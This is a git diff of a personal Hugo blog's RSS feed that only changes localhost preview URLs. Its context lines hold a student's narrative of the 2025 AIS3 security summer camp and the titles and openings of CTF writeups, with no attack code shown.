 &lt;/h1&gt;&lt;p&gt;After wasting some time, I went to HITCON and got a bottle of wine that I didn’t get at DEVCORE CONFERENCE (but I wasn’t 18 at the time).&lt;br&gt;
 I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_a6b44e25dff1788c.jpg 480w, http://localhost:50608/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_c8eae1dd229792d.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_a6b44e25dff1788c.jpg 480w, http://localhost:1313/post/2025-ais3-junior-%E5%BF%83%E5%BE%97/1_hu_c8eae1dd229792d.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Got it again after five months&#34;
@@ -844,11 +844,11 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
         </item>
         <item>
         <title>2025 AIS3&#39;s Experience</title>
-        <link>http://localhost:50608/en/post/2025-ais3s-experience/</link>
+        <link>http://localhost:1313/en/post/2025-ais3s-experience/</link>
         <pubDate>Wed, 13 Aug 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2025-ais3s-experience/</guid>
-        <description>&lt;img src="http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3&#39;s Experience" /&gt;&lt;h1 id=&#34;preface&#34;&gt;Preface
+        <guid>http://localhost:1313/en/post/2025-ais3s-experience/</guid>
+        <description>&lt;img src="http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/image.png" alt="Featured image of post 2025 AIS3&#39;s Experience" /&gt;&lt;h1 id=&#34;preface&#34;&gt;Preface
 &lt;/h1&gt;&lt;p&gt;I see most people are writing introductions and team selection stuff, so I guess I&amp;rsquo;ll write something too.&lt;/p&gt;
 &lt;p&gt;AIS3: Advanced Information Security - Summer School&lt;/p&gt;
 &lt;p&gt;It&amp;rsquo;s basically a camp where you quickly bond with your teammates over seven days and work together on a project. Of course, besides the project, there are also courses. You can see &amp;ldquo;Advanced&amp;rdquo; in the AIS3 name - as the name suggests, the classes are pretty hardcore and you get very little sleep ☠️&lt;/p&gt;
@@ -861,10 +861,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &lt;h1 id=&#34;day-0&#34;&gt;Day 0
 &lt;/h1&gt;&lt;p&gt;This day was cool. Chatting with teammates I didn&amp;rsquo;t know yet, and turns out even though we&amp;rsquo;d never met, we had quite a few mutual friends. The tech circle is really small, I guess.&lt;/p&gt;
 &lt;p&gt;Of course, had to play some GTA that I hadn&amp;rsquo;t played in a while since Day 0 was when we could still have fun&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/13.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/13.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1536&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_da87c8a4dce5fd62.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_9937dd354e00fb61.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_da87c8a4dce5fd62.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/13_hu_9937dd354e00fb61.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;GTA&#34;
@@ -877,10 +877,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;h1 id=&#34;day-1&#34;&gt;Day 1
 &lt;/h1&gt;&lt;p&gt;First thing in the morning, I saw the whole week&amp;rsquo;s schedule and took a pic.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/2.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/2.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_1d8b9a6ced62055.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_e7a34ce312236dbb.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_1d8b9a6ced62055.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/2_hu_e7a34ce312236dbb.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Seven-day class schedule&#34;
@@ -896,10 +896,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &lt;p&gt;Lunch was free Subway. Free food is always awesome.&lt;/p&gt;
 &lt;p&gt;The afternoon classes were more understandable.&lt;/p&gt;
 &lt;p&gt;The ice-breaker activities were pretty fun. We solved three problems.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/14.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/14.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_51cdffd18e617ca4.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_b40ff4380f23ff04.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_51cdffd18e617ca4.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/14_hu_b40ff4380f23ff04.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Ice-breaking activities&#34;
@@ -913,10 +913,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &lt;h1 id=&#34;day-2&#34;&gt;Day 2
 &lt;/h1&gt;&lt;p&gt;Most of Day 2 sounded okay, but I really couldn&amp;rsquo;t understand the quantum security stuff.&lt;/p&gt;
 &lt;p&gt;The all-you-can-eat fried chicken, pizza, and drinks in the evening was nice. Ate pretty well. My teammate even took a whole box of pizza back to the dorm to go with our project discussions.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/12.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/12.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_c62b30b429b42641.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_fb3ed8f033043be5.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_c62b30b429b42641.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/12_hu_fb3ed8f033043be5.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Discussion topic&#34;
@@ -939,10 +939,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &lt;h1 id=&#34;day-6&#34;&gt;Day 6
 &lt;/h1&gt;&lt;p&gt;Day 6 morning was basically either sleeping or preparing speech notes (which we didn&amp;rsquo;t end up using anyway).&lt;/p&gt;
 &lt;p&gt;Soon it was noon, and thinking we were too tired before the presentation, we decided we had to eat something good. So I ate lunch that cost twice my budget from the previous days. Then after that, thinking &amp;ldquo;the presentation&amp;rsquo;s over, let&amp;rsquo;s eat well,&amp;rdquo; I kept ordering expensive stuff and burned through money super fast 😢&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/4.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/4.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1536&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_b371c2bdaab5a8f6.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_eeeedde002fe44bb.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_b371c2bdaab5a8f6.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/4_hu_eeeedde002fe44bb.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Report Image&#34;
@@ -955,10 +955,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;I thought our presentation was just okay, but two judges seemed pretty interested in our work. Either we were definitely getting the best project award or we had nothing special, but I figured since it was my first time at AIS3, just getting the completion certificate would be good enough. So I went to eat at Costco, but couldn&amp;rsquo;t get in and ended up eating McDonald&amp;rsquo;s at the girls&amp;rsquo; dorm instead.&lt;/p&gt;
 &lt;p&gt;In the evening, I originally planned to wash up and sleep early, but remembered I still had 100 minutes left on my 200-minute oloo rental, so I went out for a ride around NTHU and NTHU night market.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/11.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/11.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_5201773f74381f2.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_6169ddbf9fd91173.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_5201773f74381f2.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/11_hu_6169ddbf9fd91173.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;National Tsing Hua University Night Market&#34;
@@ -968,10 +968,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 		data-flex-grow=&#34;75&#34;
 		data-flex-basis=&#34;180px&#34;
 	
-&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/7.jpg&#34;
+&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/7.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_12956f001549f6aa.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_55a17eab119a176a.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_12956f001549f6aa.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/7_hu_55a17eab119a176a.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;National Tsing Hua University Gate&#34;
@@ -983,10 +983,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;When I rode back, I still had 50 minutes left, so I went downstairs to see how hard everyone was grinding. Saw someone had already taken down Windows&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/3.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/3.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_949c38f6c53d0b2b.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_38481d928c98dcf9.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_949c38f6c53d0b2b.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/3_hu_38481d928c98dcf9.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Windows knocked down&#34;
@@ -998,10 +998,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;Later around 1 AM, after eating a late-night snack and couldn&amp;rsquo;t sleep, I went out for another 30-minute oloo ride and saw this tragic scene.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/6.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/6.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_b03233d3bd0de576.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_886f76dbe8e76dda.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_b03233d3bd0de576.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/6_hu_886f76dbe8e76dda.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Broken head oloo&#34;
@@ -1013,10 +1013,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;But there were also some nice views, though I took terrible photos.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/10.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/10.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_da6358b3c815cb9.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_f84dd5c48df3081d.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_da6358b3c815cb9.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/10_hu_f84dd5c48df3081d.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Bamboo Lake in the early morning&#34;
@@ -1031,10 +1031,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &lt;h1 id=&#34;day-7&#34;&gt;Day 7
 &lt;/h1&gt;&lt;p&gt;This morning was basically all sleeping, only got up to listen to a few presentations.&lt;/p&gt;
 &lt;p&gt;In the afternoon, just got up to receive awards and then headed back to prepare for summer tutoring the next day.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/8.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/8.jpg&#34;
 	width=&#34;2048&#34;
 	height=&#34;1362&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_1ec9a205569fb382.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_e02e570c5d4b787e.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_1ec9a205569fb382.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/8_hu_e02e570c5d4b787e.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Thanks to all my teammates ヾ(@^▽^@)ノ&#34;
@@ -1047,10 +1047,10 @@ I will make up for these two Conf articles as soon as possible QAQ&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;When I heard there were Jess clothes during the award ceremony, my eyes lit up 👀&lt;br&gt;
 Saw my number and immediately picked it.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/5.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/5.jpg&#34;
 	width=&#34;1536&#34;
 	height=&#34;2048&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_800ed5dc4ba968ad.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_3d5fde8135b4847f.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_800ed5dc4ba968ad.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/5_hu_3d5fde8135b4847f.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;All Prizes&#34;
@@ -1062,10 +1062,10 @@ Saw my number and immediately picked it.&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;Of course, had to take a group photo with the AIS3 sign (unfortunately forgot to take a solo pic QQ).&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/9.jpg&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/9.jpg&#34;
 	width=&#34;4032&#34;
 	height=&#34;3024&#34;
-	srcset=&#34;http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_77d36d40723fcae5.jpg 480w, http://localhost:50608/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_ad506a54d6c12e8.jpg 1024w&#34;
+	srcset=&#34;http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_77d36d40723fcae5.jpg 480w, http://localhost:1313/post/2025-ais3-%E5%BF%83%E5%BE%97/9_hu_ad506a54d6c12e8.jpg 1024w&#34;
 	loading=&#34;lazy&#34;
 	
 		alt=&#34;Group photo in front of the group sign&#34;
@@ -1095,10 +1095,10 @@ Saw my number and immediately picked it.&lt;/p&gt;
         </item>
         <item>
         <title>2025 AIS3 Pre-exam&#39;s Writeup</title>
-        <link>http://localhost:50608/en/post/2025-ais3-pre-exams-writeup/</link>
+        <link>http://localhost:1313/en/post/2025-ais3-pre-exams-writeup/</link>
         <pubDate>Mon, 26 May 2025 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2025-ais3-pre-exams-writeup/</guid>
+        <guid>http://localhost:1313/en/post/2025-ais3-pre-exams-writeup/</guid>
         <description>&lt;img src="https://hackmd.io/_uploads/HkXttAUMge.png" alt="Featured image of post 2025 AIS3 Pre-exam&#39;s Writeup" /&gt;&lt;h2 id=&#34;ranking&#34;&gt;Ranking
 &lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://hackmd.io/_uploads/HkXttAUMge.png&#34;
 	
@@ -1812,21 +1812,21 @@ Exploit:&lt;/p&gt;
         </item>
         <item>
         <title>Hello World</title>
-        <link>http://localhost:50608/en/post/hello-world/</link>
+        <link>http://localhost:1313/en/post/hello-world/</link>
         <pubDate>Sat, 12 Apr 2025 21:52:19 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/hello-world/</guid>
+        <guid>http://localhost:1313/en/post/hello-world/</guid>
         <description>&lt;p&gt;This article is to talk about my recent situation. I will be busy preparing for my certificates and licenses before June and will have no time to update my blog. After I am done with that, I will slowly update articles about SITCON 2025 and DEVCORE CONFERENCE 2025 when I have time.&lt;br&gt;
 Also, when I was working on this blog, I somehow made it dual-language. Although it takes some time to update, it looks pretty good (right?&lt;/p&gt;
 </description>
         </item>
         <item>
         <title>2024 AIS3 Junior LLM&#39;s Writeup</title>
-        <link>http://localhost:50608/en/post/2024-ais3-junior-llms-writeup/</link>
+        <link>http://localhost:1313/en/post/2024-ais3-junior-llms-writeup/</link>
         <pubDate>Sun, 18 Aug 2024 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2024-ais3-junior-llms-writeup/</guid>
-        <description>&lt;img src="http://localhost:50608/post/2024-ais3-junior-llm%E3%84%89writeup/image.png" alt="Featured image of post 2024 AIS3 Junior LLM&#39;s Writeup" /&gt;&lt;h1 id=&#34;ais3-junior-llm-writeup&#34;&gt;AIS3 Junior LLM Writeup
+        <guid>http://localhost:1313/en/post/2024-ais3-junior-llms-writeup/</guid>
+        <description>&lt;img src="http://localhost:1313/post/2024-ais3-junior-llm%E3%84%89writeup/image.png" alt="Featured image of post 2024 AIS3 Junior LLM&#39;s Writeup" /&gt;&lt;h1 id=&#34;ais3-junior-llm-writeup&#34;&gt;AIS3 Junior LLM Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;感受gptㄉ魔力吧&#34;&gt;感受GPTㄉ魔力吧
 &lt;/h2&gt;&lt;p&gt;After executing netcat, a bunch of meows appeared&lt;br&gt;
 &lt;img src=&#34;https://hackmd.io/_uploads/HkfrKthcA.png&#34;
@@ -2433,10 +2433,10 @@ So let&amp;rsquo;s break down the instructor&amp;rsquo;s attack.py file. I&amp;r
         </item>
         <item>
         <title>2024 AIS3 Junior Web&#39;s Writeup</title>
-        <link>http://localhost:50608/en/post/2024-ais3-junior-webs-writeup/</link>
+        <link>http://localhost:1313/en/post/2024-ais3-junior-webs-writeup/</link>
         <pubDate>Sun, 18 Aug 2024 00:00:00 +0800</pubDate>
         
-        <guid>http://localhost:50608/en/post/2024-ais3-junior-webs-writeup/</guid>
+        <guid>http://localhost:1313/en/post/2024-ais3-junior-webs-writeup/</guid>
         <description>&lt;h1 id=&#34;ais3-junior-web-writeup&#34;&gt;AIS3 Junior Web Writeup
 &lt;/h1&gt;&lt;h2 id=&#34;bac01&#34;&gt;BAC01
 &lt;/h2&gt;&lt;p&gt;Just fill in 1 in the input box and see&lt;/p&gt;
